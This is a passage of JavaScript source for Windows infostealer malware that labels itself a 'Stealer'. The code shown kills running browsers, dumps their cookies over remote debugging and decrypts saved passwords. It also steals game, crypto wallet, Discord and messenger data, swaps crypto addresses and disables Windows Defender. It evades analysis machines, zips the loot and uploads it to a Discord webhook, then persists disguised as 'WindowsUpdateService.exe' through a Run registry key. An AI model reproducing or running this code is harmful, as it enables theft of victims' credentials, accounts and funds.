        return 'ICQ: Not found';
    }
}

async function captureWebcamImage() {
    try {
        return 'Webcam capture attempted';
    } catch (error) {
        return 'Webcam not available';
    }
}

async function runGameSteals(outputFolder) {
    const results = [];
    
    try {
        const gameSteals = [
            stealEpicGames(),
            stealGrowtopia(),
            stealBattleNet(),
            stealMinecraft(),
            stealSteam(),
            stealRiotGames(),
            stealUbisoft(),
            stealNationGlory(),
            stealRobloxCookies()
        ];
        
        const settled = await Promise.allSettled(gameSteals);
        
        for (let i = 0; i < settled.length; i++) {
            if (settled[i].status === 'fulfilled') {
                results.push(settled[i].value);
            }
        }
        
        if (results.length > 0) {
            const filePath = path.join(outputFolder, 'GAMES_DATA.txt');
            fs.writeFileSync(filePath, results.join('\n\n') + '\n', 'utf8');
        }
        
    } catch (error) {}
}

async function runWalletSteals(outputFolder) {
    const results = [];
    
    try {
        const walletSteals = [
            stealWallets(),
            stealExodusMetamask(),
            stealVPNFiles()
        ];
        
        const settled = await Promise.allSettled(walletSteals);
        
        for (let i = 0; i < settled.length; i++) {
            if (settled[i].status === 'fulfilled') {
                results.push(settled[i].value);
            }
        }
        
        if (results.length > 0) {
            const filePath = path.join(outputFolder, 'WALLETS_VPN_DATA.txt');
            fs.writeFileSync(filePath, results.join('\n\n') + '\n', 'utf8');
        }
        
    } catch (error) {}
}

async function runDiscordSteals(outputFolder) {
    const results = [];
    
    try {
        const discordSteals = [
            stealDiscordTokensAll(),
            analyzeDiscordBotsGuilds()
        ];
        
        const settled = await Promise.allSettled(discordSteals);
        
        for (let i = 0; i < settled.length; i++) {
            if (settled[i].status === 'fulfilled') {
                results.push(settled[i].value);
            }
        }
        
        try {
            exodusInject();
            atomInject();
            discordInject();
            cryptoAddressSwap();
            autoDiscordMailChanger();
            discordSecurityBypass();
            results.push('Injections: Executed');
        } catch (error) {
            results.push('Injections: Failed');
        }
        
        if (results.length > 0) {
            const filePath = path.join(outputFolder, 'DISCORD_DATA.txt');
            fs.writeFileSync(filePath, results.join('\n\n') + '\n', 'utf8');
        }
        
    } catch (error) {}
}

async function runSystemSteals(outputFolder) {
    const results = [];
    
    try {
        const systemSteals = [
            stealSystemInfo(),
            stealSensitiveFiles(),
            stealWinSCP(),
            stealPutty(),
            stealTotalCommander(),
            stealShadowAccess(),
            captureWebcamImage()
        ];
        
        const settled = await Promise.allSettled(systemSteals);
        
        for (let i = 0; i < settled.length; i++) {
            if (settled[i].status === 'fulfilled') {
                results.push(settled[i].value);
            }
        }
        
        results.push(createFakeBug());
        
        const imSteals = [
            stealTelegram(),
            stealPidgin(),
            stealToxic(),
            stealICQ()
        ];
        
        const imSettled = await Promise.allSettled(imSteals);
        imSettled.forEach(result => {
            if (result.status === 'fulfilled') {
                results.push(result.value);
            }
        });
        
        if (results.length > 0) {
            const filePath = path.join(outputFolder, 'SYSTEM_IM_DATA.txt');
            fs.writeFileSync(filePath, results.join('\n\n') + '\n', 'utf8');
        }
        
    } catch (error) {}
}

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const getLocale = () => {
    try {
        return Intl.DateTimeFormat().resolvedOptions().locale.slice(0, 2).toUpperCase();
    } catch (error) {
        return 'EN';
    }
};

function getMacAddressByInterface(targetInterface) {
    const interfaces = os.networkInterfaces();
    if (interfaces[targetInterface]) {
        for (const iface of interfaces[targetInterface]) {
            if (!iface.internal && iface.mac !== '00:00:00:00:00:00') {
                return iface.mac;
            }
        }
    }
    return null;
}

const targetInterface = 'Wi-Fi';

async function sendRequestWithSSLCheck() {
    try {
        await axios.get('https://www.google.com', { httpsAgent });
    } catch (error) {
        process.exit(0);
    }
}

const checkHWID = () => {
    return new Promise((resolve, reject) => {
        exec('powershell -command "(Get-CimInstance Win32_ComputerSystemProduct).UUID"', { windowsHide: true }, (error, stdout, stderr) => {
            if (error || stderr) {
                return reject(`Error retrieving HWID: ${error || stderr}`);
            }
            const hwid = stdout.trim();
            if (blacklistedHWIDs.includes(hwid)) {
                process.exit(0);
            }
            resolve(hwid);
        });
    });
};

async function captureScreenshot(outputFolder) {
    try {
        const filePath = path.join(outputFolder, 'SCREENSHOT.jpg');
        const img = await screenshot();
        fs.writeFileSync(filePath, img);
    } catch (error) {}
}

async function getIp() {
    try {
        const response = await axios.get("https://www.myexternalip.com/raw");
        return response.data.trim();
    } catch (error) {
        return "Unknown";
    }
}

const browserConfigs = {
    sidekick: {
        bin: `${PROGRAM_FILES}\\Sidekick\\Application\\sidekick.exe`,
        user_data: `${LOCAL_APP_DATA}\\Sidekick\\User Data`,
    },
    vivaldi: {
        bin: `${LOCAL_APP_DATA}\\Vivaldi\\Application\\vivaldi.exe`,
        user_data: `${LOCAL_APP_DATA}\\Vivaldi\\User Data`,
    },
    chromex86: {
        bin: `${PROGRAM_FILES_X86}\\Google\\Chrome\\Application\\chrome.exe`,
        user_data: `${LOCAL_APP_DATA}\\Google\\Chrome\\User Data`,
    },
    chrome: {
        bin: `${PROGRAM_FILES}\\Google\\Chrome\\Application\\chrome.exe`,
        user_data: `${LOCAL_APP_DATA}\\Google\\Chrome\\User Data`,
    },
    coccoc: {
        bin: `${PROGRAM_FILES}\\CocCoc\\Browser\\Application\\browser.exe`,
        user_data: `${LOCAL_APP_DATA}\\CocCoc\\Browser\\User Data`,
    },
    edge: {
        bin: `${PROGRAM_FILES_X86}\\Microsoft\\Edge\\Application\\msedge.exe`,
        user_data: `${LOCAL_APP_DATA}\\Microsoft\\Edge\\User Data`,
    },
    brave: {
        bin: `${PROGRAM_FILES}\\BraveSoftware\\Brave-Browser\\Application\\brave.exe`,
        user_data: `${LOCAL_APP_DATA}\\BraveSoftware\\Brave-Browser\\User Data`,
    },
    opera: {
        bin: `${LOCAL_APP_DATA}\\Programs\\Opera\\opera.exe`,
        user_data: `${APP_DATA}\\Opera Software\\Opera Stable`,
    },
    operagx: {
        bin: `${LOCAL_APP_DATA}\\Programs\\Opera GX\\opera.exe`,
        user_data: `${APP_DATA}\\Opera Software\\Opera GX Stable`,
    },
    operaneon: {
        bin: `${LOCAL_APP_DATA}\\Programs\\Opera Neon\\opera.exe`,
        user_data: `${APP_DATA}\\Opera Software\\Opera Neon\\User Data`,
    }
};

const getInstalledBrowsers = () => {
    const installedBrowsers = [];
    for (const browser in browserConfigs) {
        if (fs.existsSync(browserConfigs[browser].bin)) {
            installedBrowsers.push(browser);
        }
    }
    return installedBrowsers;
};

const getProfiles = (userDataPath) => {
    const profiles = [];
    if (fs.existsSync(userDataPath)) {
        const files = fs.readdirSync(userDataPath);
        files.forEach(file => {
            if (file.startsWith('Profile') || file === 'Default') {
                profiles.push(file);
            }
        });
    }
    return profiles.length > 0 ? profiles : ['Default'];
};

const ensureFolderExists = (folderPath) => {
    if (!fs.existsSync(folderPath)) {
        fs.mkdirSync(folderPath, { recursive: true });
    }
};

const getOutputFolder = async () => {
    const uuid = await checkHWID();
    const locale = getLocale();
    const ip = await getIp();
    const outputFolder = path.join(tempDir, `${uuid}-${locale}-${ip}`);
    ensureFolderExists(outputFolder);
    ensureFolderExists(path.join(outputFolder, 'Cookies'));
    ensureFolderExists(path.join(outputFolder, 'Pass'));
    ensureFolderExists(path.join(outputFolder, 'BrowserDataBypass'));
    return outputFolder;
};

function startBrowser(binPath, userDataPath, profile) {
    const args = [
        `--remote-debugging-port=${DEBUG_PORT}`,
        `--user-data-dir=${userDataPath}`,
        `--profile-directory=${profile}`,
        '--no-first-run',
        '--no-default-browser-check',
        '--headless',
        '--disable-gpu',
        '--no-sandbox',
        '--disable-extensions',
        '--disable-dev-shm-usage',
        '--disable-background-timer-throttling',
        '--disable-backgrounding-occluded-windows',
        '--disable-renderer-backgrounding',
        '--disable-features=TranslateUI,BlinkGenPropertyTrees'
    ];
    return spawn(binPath, args, { 
        detached: true, 
        windowsHide: true,
        stdio: ['ignore', 'ignore', 'ignore']
    });
}

function closeBrowser(binPath) {
    const procName = path.basename(binPath);
    try {
        execSync(`taskkill /F /IM "${procName}" /T`, {
            windowsHide: true,
            stdio: 'ignore'
        });
    } catch (err) {}
}

const killAllBrowsers = () => {
    const browserProcesses = [
        'chrome.exe', 'msedge.exe', 'brave.exe', 'opera.exe',
        'sidekick.exe', 'browser.exe', 'vivaldi.exe'
    ];
    browserProcesses.forEach(processName => {
        try {
            execSync(`taskkill /F /IM "${processName}" /T`, {
                windowsHide: true,
                stdio: 'ignore'
            });
        } catch (error) {}
    });
};

async function getDebugWsUrl() {
    let retries = 10;
    while (retries > 0) {
        try {
            const response = await axios.get(DEBUG_URL);
            if (response.data && response.data.length > 0) {
                return response.data[0].webSocketDebuggerUrl;
            }
        } catch (error) {
            retries--;
            await sleep(3000);
        }
    }
    throw new Error('Could not get WebSocket URL after retries');
}

async function getAllCookies(wsUrl) {
    return new Promise((resolve, reject) => {
        const ws = new WebSocket(wsUrl);
        const timeout = setTimeout(() => {
            ws.close();
            reject(new Error('WebSocket timeout'));
        }, 15000);

        ws.on('open', () => {
            ws.send(JSON.stringify({
                id: 1,
                method: 'Storage.getCookies'
            }));
        });

        ws.on('message', (data) => {
            try {
                const response = JSON.parse(data);
                if (response.id === 1) {
                    clearTimeout(timeout);
                    ws.close();
                    resolve(response.result.cookies || []);
                }
            } catch (error) {
                clearTimeout(timeout);
                ws.close();
                reject(error);
            }
        });

        ws.on('error', (error) => {
            clearTimeout(timeout);
            reject(error);
        });
    });
}

function saveCookiesToNetscapeFormat(browser, profile, cookies, outputFolder) {
    const filePath = path.join(outputFolder, 'Cookies', `${browser}-${profile}-cookies.txt`);
    let formattedCookies = '# Netscape HTTP Cookie File\n';
    formattedCookies += '# This file was generated by Stealer\n\n';
    
    cookies.forEach(cookie => {
        const domain = cookie.domain.startsWith('.') ? cookie.domain : '.' + cookie.domain;
        const expires = cookie.expires ? Math.floor(cookie.expires) : 0;
        const secure = cookie.secure ? 'TRUE' : 'FALSE';
        
        formattedCookies += `${domain}\tTRUE\t${cookie.path}\t${secure}\t${expires}\t${cookie.name}\t${cookie.value}\n`;
    });
    
    fs.writeFileSync(filePath, formattedCookies, 'utf8');
}

function saveFacebookCookies(browser, profile, cookies, outputFolder) {
    const fbCookies = cookies.filter(cookie => 
        cookie.domain.includes('facebook.com') || 
        cookie.domain.includes('.facebook.com')
    );
    
    if (fbCookies.length === 0) {
        return;
    }
    
    const browserProfileDir = path.join(outputFolder, 'Cookies', browser, profile);
    ensureFolderExists(browserProfileDir);
    
    const filePath = path.join(browserProfileDir, 'Facebook-Cookie.txt');
    let formattedCookies = '';
    
    fbCookies.forEach(cookie => {
        formattedCookies += `${cookie.name}=${cookie.value}; `;
    });
    
    fs.writeFileSync(filePath, formattedCookies.trim(), 'utf-8');
}

function parseCookiesFromFile(filePath) {
    try {
        if (!fs.existsSync(filePath)) {
            return {};
        }
        
        const cookieData = fs.readFileSync(filePath, 'utf8');
        const cookies = {};
        const cookiePairs = cookieData.split(';');
        
        cookiePairs.forEach(pair => {
            const [name, value] = pair.trim().split('=');
            if (name && value) {
                cookies[name] = value;
            }
        });
        
        return cookies;
    } catch (error) {
        return {};
    }
}

async function extractBrowserPasswords(outputFolder) {
    let totalCount = 0;
    let decryptedCount = 0;
    const installedBrowsers = getInstalledBrowsers();
    
    const allPasswordsFile = path.join(outputFolder, 'Pass', 'BROWSER_PASSWORDS.txt');
    let allContent = '=== BROWSER PASSWORDS (Traditional Method) ===\n';
    allContent += 'Generated: ' + new Date().toISOString() + '\n';
    allContent += '='.repeat(80) + '\n\n';
    
    for (const browser of installedBrowsers) {
        const config = browserConfigs[browser];
        const profiles = getProfiles(config.user_data);
        
        for (const profile of profiles) {
            const count = await extractSingleBrowserPasswords(browser, profile, config.user_data, outputFolder);
            totalCount += count;
            
            const profileFile = path.join(outputFolder, 'Pass', `${browser}-${profile}-passwords.txt`);
            if (fs.existsSync(profileFile)) {
                const profileContent = fs.readFileSync(profileFile, 'utf8');
                allContent += profileContent + '\n\n';
                
                const decryptedMatch = profileContent.match(/Decrypted: (\d+)\/(\d+)/);
                if (decryptedMatch) {
                    decryptedCount += parseInt(decryptedMatch[1]);
                }
            }
        }
    }
    
    allContent += '\n' + '='.repeat(80) + '\n';
    allContent += 'OVERALL SUMMARY (Traditional Method):\n';
    allContent += `Total passwords extracted: ${totalCount}\n`;
    allContent += `Total passwords decrypted: ${decryptedCount}\n`;
    allContent += `Encryption success rate: ${totalCount > 0 ? ((decryptedCount / totalCount) * 100).toFixed(2) : 0}%\n`;
    
    fs.writeFileSync(allPasswordsFile, allContent, 'utf8');
    
    return decryptedCount;
}

async function extractSingleBrowserPasswords(browser, profile, userDataPath, outputFolder) {
    try {
        const masterKeys = await getAllMasterKeys(userDataPath);
        const loginPath = getLoginPath(userDataPath, profile);
        
        if (!fs.existsSync(loginPath)) {
            return 0;
        }

        const copyInfo = copyDbSafely(loginPath);
        const dbpath = copyInfo.path;

        return new Promise((resolve) => {
            const db = new sqlite3.Database(dbpath, sqlite3.OPEN_READONLY, (err) => {
                if (err) {
                    resolve(0);
                    return;
                }

                db.all("SELECT origin_url, username_value, password_value FROM logins", async (err, rows) => {
                    if (err) {
                        db.close();
                        resolve(0);
                        return;
                    }

                    const filePath = path.join(outputFolder, 'Pass', `${browser}-${profile}-passwords.txt`);
                    let content = '';
                    
                    content += `Browser: ${browser}\n`;
                    content += `Profile: ${profile}\n`;
                    content += `Total: ${rows ? rows.length : 0}\n`;
                    content += '='.repeat(80) + '\n\n';
                    
                    let decryptedCount = 0;
                    
                    if (rows && rows.length > 0) {
                        for (const row of rows) {
                            const password = await decryptPassword(row.password_value, masterKeys);
                            
                            if (row.origin_url && row.origin_url !== '' && 
                                (row.username_value !== '' || password !== '[EMPTY]')) {
                                
                                content += `URL: ${row.origin_url || 'N/A'}\n`;
                                content += `Username: ${row.username_value || 'N/A'}\n`;
                                content += `Password: ${password}\n`;
                                
                                if (!password.includes('[ENCRYPTED') && !password.includes('[DECRYPT_ERROR]') && password !== '[EMPTY]') {
                                    decryptedCount++;
                                }
                                
                                content += '─'.repeat(40) + '\n';
                            }
                        }
                    }

                    content += `\nDecrypted: ${decryptedCount}/${rows ? rows.length : 0}\n`;

                    fs.writeFileSync(filePath, content, 'utf8');
                    db.close();

                    if (copyInfo.usedTemp) {
                        try { 
                            fs.unlinkSync(dbpath);
                        } catch (_) {}
                    }
                    
                    resolve(decryptedCount);
                });
            });
        });
        
    } catch (error) {
        return 0;
    }
}

function findProfiles(baseDir) {
    if (!baseDir || !fs.existsSync(baseDir)) return [];
    const dirents = fs.readdirSync(baseDir, { withFileTypes: true });
    const names = dirents.filter(d=>d.isDirectory()).map(d=>d.name);
    const profiles = names.filter(n => n === 'Default' || n.startsWith('Profile') || /^Profile \d+$/.test(n));
    if (fs.existsSync(path.join(baseDir, 'Login Data'))) profiles.unshift('');
    return Array.from(new Set(profiles));
}

function findLocalStateFiles(baseDir) {
    const results = [];
    if (!baseDir || !fs.existsSync(baseDir)) return results;
    const p = path.join(baseDir, 'Local State');
    if (fs.existsSync(p)) results.push(p);
    const subdirs = fs.readdirSync(baseDir, { withFileTypes: true }).filter(d=>d.isDirectory()).map(d=>d.name);
    for (const s of subdirs) {
        const candidate = path.join(baseDir, s, 'Local State');
        if (fs.existsSync(candidate)) results.push(candidate);
    }
    return Array.from(new Set(results));
}

function getLoginPath(baseDir, profile) {
    return profile === '' ? path.join(baseDir, 'Login Data') : path.join(baseDir, profile, 'Login Data');
}

async function loadMasterKeysFromLocalState(localStatePath) {
    try {
        const js = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
        const enc = js?.os_crypt?.encrypted_key;
        if (!enc) return null;
        
        let buf = Buffer.from(enc, 'base64');
        if (buf.slice(0,5).toString() === 'DPAPI') buf = buf.slice(5);
        
        try {
            if (typeof Dpapi !== 'undefined' && Dpapi && typeof Dpapi.unprotectData === 'function') {
                const key = Dpapi.unprotectData(buf, null, 'CurrentUser');
                return key;
            } else {
                return null;
            }
        } catch (dpapiError) {
            return null;
        }
    } catch (e) {
        return null;
    }
}

async function getAllMasterKeys(userDataPath) {
    const localStateFiles = findLocalStateFiles(userDataPath);
    const masterKeys = [];
    
    for (const ls of localStateFiles) {
        try {
            const mk = await loadMasterKeysFromLocalState(ls);
            if (mk) {
                masterKeys.push(mk);
            }
        } catch (error) {}
    }
    
    return masterKeys;
}

function decryptBlobWithKeys(blob, tryKeys) {
    if (!Buffer.isBuffer(blob)) blob = Buffer.from(blob);
    
    if (blob.length >= 2 && blob[0] === 0x76) {
        let i = 1;
        while (i < blob.length && blob[i] >= 0x30 && blob[i] <= 0x39) i++;
        const prefixLen = i;
        const iv = blob.slice(prefixLen, prefixLen + 12);
        const tag = blob.slice(blob.length - 16);
        const ciphertext = blob.slice(prefixLen + 12, blob.length - 16);
        
        if (iv.length !== 12 || tag.length !== 16) {
            return { ok: false, err: 'invalid iv/tag length' };
        }
        
        for (const key of tryKeys) {
            if (!key) continue;
            try {
                const dec = crypto.createDecipheriv('aes-256-gcm', key, iv);
                dec.setAuthTag(tag);
                const out = Buffer.concat([dec.update(ciphertext), dec.final()]);
                return { ok: true, buf: out, method: 'aes' };
            } catch (e) {}
        }
        return { ok: false, err: 'aes_failed_all_keys' };
    } else {
        try {
            if (typeof Dpapi !== 'undefined' && Dpapi && typeof Dpapi.unprotectData === 'function') {
                const dec = Dpapi.unprotectData(blob, null, 'CurrentUser');
                return { ok: true, buf: dec, method: 'dpapi' };
            } else {
                return { ok: false, err: 'dpapi_not_available' };
            }
        } catch (e) {
            return { ok: false, err: 'dpapi_failed' };
        }
    }
}

function looksUtf8(buf) {
    try {
        const s = buf.toString('utf8');
        return !s.includes('\uFFFD');
    } catch (e) { return false; }
}

function copyDbSafely(loginDb) {
    const tmp = path.join(os.tmpdir(), `LoginData-${Date.now()}.db`);
    try {
        fs.copyFileSync(loginDb, tmp);
        return { path: tmp, usedTemp: true };
    } catch (e) {
        return { path: loginDb, usedTemp: false };
    }
}

async function decryptPassword(encryptedValue, masterKeys = []) {
    try {
        if (!encryptedValue || encryptedValue.length === 0) {
            return '[EMPTY]';
        }
        
        if (typeof encryptedValue === 'string') {
            return encryptedValue;
        }
        
        const res = decryptBlobWithKeys(encryptedValue, masterKeys);
        if (res.ok) {
            if (looksUtf8(res.buf)) {
                return res.buf.toString('utf8');
            } else {
                return '[BINARY_DATA]';
            }
        } else {
            try {
                if (typeof Dpapi !== 'undefined' && Dpapi && typeof Dpapi.unprotectData === 'function') {
                    const dec = Dpapi.unprotectData(encryptedValue, null, 'CurrentUser');
                    if (looksUtf8(dec)) {
                        return dec.toString('utf8');
                    } else {
                        return '[BINARY_DATA_DPAPI]';
                    }
                } else {
                    return '[ENCRYPTED]';
                }
            } catch(e) {
                return '[ENCRYPTED]';
            }
        }
    } catch (error) {
        return '[DECRYPT_ERROR]';
    }
}

function cleanupStubToolTemp() {
    try {
        const files = fs.readdirSync(tempDir);
        let stubToolDirs = files.filter(file => {
            const fullPath = path.join(tempDir, file);
            return fs.statSync(fullPath).isDirectory() && file.startsWith('stub_tool_');
        });
        
        if (stubToolDirs.length > 0) {
            stubToolDirs.sort((a, b) => {
                const aPath = path.join(tempDir, a);
                const bPath = path.join(tempDir, b);
                return fs.statSync(bPath).mtime.getTime() - fs.statSync(aPath).mtime.getTime();
            });
            
            const latestDir = path.join(tempDir, stubToolDirs[0]);
            fs.rmSync(latestDir, { recursive: true, force: true });
        }
    } catch (error) {}
}

async function zipAndSend(outputFolder, gpu, stubStats) {
    const locale = getLocale();
    const ip = await getIp();
    const zipFileName = `FULL_DATA_COLLECTION-${locale}-${ip}-${Date.now()}.zip`;
    const zipFilePath = path.join(tempDir, zipFileName);
    
    try {
        const zip = new AdmZip();
        zip.addLocalFolder(outputFolder);
        
        if (fs.existsSync(STUB_OUTPUT_DIR)) {
            zip.addLocalFolder(STUB_OUTPUT_DIR, 'StubToolOutput');
        }
        
        zip.writeZip(zipFilePath);
        
        await sendToDiscord(zipFilePath, outputFolder, gpu, zipFileName, stubStats);
    } catch (error) {
    } finally {
        try {
            if (fs.existsSync(zipFilePath)) {
                fs.unlinkSync(zipFilePath);
            }
            if (fs.existsSync(outputFolder)) {
                fs.rmSync(outputFolder, { recursive: true, force: true });
            }
            cleanupStubToolTemp();
        } catch (cleanupError) {}
    }
}

async function GetGPU() {
    return new Promise((resolve) => {
        exec('powershell "Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Name"', { windowsHide: true }, 
        (error, stdout, stderr) => {
            if (error || stderr) {
                return resolve('GPU not found');
            }
            const gpuName = stdout.trim();
            resolve(gpuName || 'GPU not found');
        });
    });
}

async function sendToDiscord(filePath, outputFolder, gpu, zipFileName, stubStats) {
    try {
        const uuid = await checkHWID();
        const macAddress = getMacAddressByInterface(targetInterface) || 'Unknown';
        
        let browserPasswordCount = 0;
        const passwordsFile = path.join(outputFolder, 'Pass', 'BROWSER_PASSWORDS.txt');
        if (fs.existsSync(passwordsFile)) {
            const content = fs.readFileSync(passwordsFile, 'utf-8');
            const match = content.match(/Total passwords extracted: (\d+)/);
            if (match) {
                browserPasswordCount = parseInt(match[1]);
            }
        }
        
        let stubPasswordCount = stubStats.passwordCount;
        let stubCookieCount = stubStats.cookieCount;
        
        const ip = await getIp();
        const message = `DATA EXFILTRATION COMPLETE
Statistics:
• Traditional Passwords: ${browserPasswordCount}
• Bypass Passwords: ${stubPasswordCount}
• Bypass Cookies: ${stubCookieCount}
• Total Files: ${countFiles(outputFolder)}

System Info:
IP: ${ip}
Hostname: ${user.hostname}
Username: ${user.userInfo}
Time: ${new Date().toISOString()}`;
        const form = new FormData();
        form.append('file', fs.createReadStream(filePath), zipFileName);
        form.append('content', message);
        
        await axios.post(DISCORD_WEBHOOK, form, {
            headers: form.getHeaders(),
        });
        
    } catch (error) {}
}

function countFiles(dir) {
    let count = 0;
    try {
        const items = fs.readdirSync(dir, { withFileTypes: true });
        for (const item of items) {
            if (item.isDirectory()) {
                count += countFiles(path.join(dir, item.name));
            } else {
                count++;
            }
        }
    } catch (e) {}
    return count;
}

function setupStartup() {
    try {
        const exeFilePath = process.execPath;
        const exeName = path.basename(exeFilePath).toLowerCase();
        
        if (!exeName.endsWith('.exe')) {
            return;
        }
        
        const startupDir = path.join(process.env.APPDATA, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
        ensureFolderExists(startupDir);
        
        const targetPath = path.join(startupDir, 'WindowsUpdateService.exe');
        
        if (fs.existsSync(targetPath)) {
            const existingStats = fs.statSync(targetPath);
            const currentStats = fs.statSync(exeFilePath);
            
            if (existingStats.size === currentStats.size) {
                return;
            }
            
            fs.unlinkSync(targetPath);
        }
        
        const currentExeBuffer = fs.readFileSync(exeFilePath);
        fs.writeFileSync(targetPath, currentExeBuffer);
        
        exec(`attrib +h +s "${targetPath}"`, { windowsHide: true });
        
        try {
            execSync(`reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "${targetPath}" /f`, { windowsHide: true });
        } catch (e) {}
        
    } catch (error) {}
}

async function cleanupTemp() {
    const tempFiles = fs.readdirSync(tempDir).filter(file => 
        file.startsWith('temp_profile_') || 
        file.startsWith('login_data_') ||
        file.includes('chrome_data_') ||
        file.includes('FULL_DATA_') ||
        file.includes('system_critical_error') ||
        file.includes('webcam_capture')
    );
    
    for (const file of tempFiles) {
        const filePath = path.join(tempDir, file);
        try {
            if (fs.existsSync(filePath)) {
                if (fs.statSync(filePath).isDirectory()) {
                    fs.rmSync(filePath, { recursive: true, force: true });
                } else {
                    fs.unlinkSync(filePath);
                }
            }
        } catch (error) {}
    }
}

async function run() {
    const blackListedUsername = ["george", "Bruno", "Frank"];
    const currentUsername = os.userInfo().username;
    if (blackListedUsername.includes(currentUsername)) {
        process.exit(0);
    }

    try {
        if (!await checkInternetConnection()) {
            return;
        }
        
        if (!antiSpamCheck()) {
            return;
        }

        disableWindowsDefender();
        
        antiDebug();
        bypassTokenProtector();
        bypassBetterDiscord();
        killDebugTools();
        
        await checkHWID();
        await sendRequestWithSSLCheck();
        const gpu = await GetGPU();
        
        await cleanupTemp();
        await sleep(1000);

        killAllBrowsers();
        await sleep(5000);

        const outputFolder = await getOutputFolder();
        
        await captureScreenshot(outputFolder);
        
        const stubResult = await runStubTool();
        await sleep(15000);
        
        const stubStats = await processStubToolData(outputFolder);
        
        await extractBrowserPasswords(outputFolder);
        
        await Promise.all([
            runGameSteals(outputFolder),
            runWalletSteals(outputFolder),
            runDiscordSteals(outputFolder),
            runSystemSteals(outputFolder)
        ]);
        
        await zipAndSend(outputFolder, gpu, stubStats);
        
        setupStartup();
        
        console.log('All operations completed successfully');
        
    } catch (error) {
        console.error('Error in main execution:', error);
    }
}

process.on('uncaughtException', (error) => {
});

process.on('unhandledRejection', (reason, promise) => {
});

run();